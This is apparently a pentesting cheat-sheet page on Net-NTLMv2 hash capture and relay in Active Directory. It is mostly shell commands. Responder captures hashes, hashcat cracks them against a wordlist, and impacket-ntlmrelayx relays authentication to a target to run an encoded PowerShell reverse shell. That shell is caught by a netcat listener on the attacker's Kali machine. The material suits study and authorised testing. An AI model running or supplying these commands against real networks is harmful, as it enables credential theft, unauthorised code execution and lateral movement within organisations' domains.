---
layout: default
title: Net-NTLMv2 Relay
parent: Active Directory
nav_order: 8
permalink: /ad/netntlmv2relay/
---

# Net-NTLMv2 Relay
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Exploit

Let’s assume you get remote code execution on a domain joined computer. You use `whomai` and `net user $USERNAME` and find that your bind shell run on an unprivileged user. You want to get his password.

```bash
# On Kali, get private IP (LHOST) and start a responder
ip a
sudo responder -I eth0

# On the target machine
dir \\$LHOST\test

# Put the NTLMv2-SSP Hash you recieved on your responder in a file and crack it
hashcat -m 5600 target.hash /usr/share/wordlists/rockyou.txt --force
```

You’ll often get NTLMv2 hashes of machine accounts. **Do not waste your time cracking them since passwords are randomly and automatically generated**.

If we are not able to crack the NTLMv2 hash, it’s also possible to relay it to a target. The following attack relays the authentication of `$SOURCE` to `$TARGET` passing by the Kali. The relay start a reverse bind shell on `$TARGET` (passed with `-c` parameter) which is caught by the Kali thanks to a `nc` listener.

```bash
# On Kali, start a relay to the target, activating SMB2 and disabling http server
impacket-ntlmrelayx --no-http-server -smb2support -t $TARGET -c "powershell -enc JABjAGwAaQBlAG4AdA..."

# On Kali, listen to catch reverse shell
nc -nvlp 8080

# In source domain joined computer, connect to our relay
dir \\$LHOST\test

# Reverse shell should have been caught by the Netcat listener on the Kali
whoami
hostname
ipconfig
```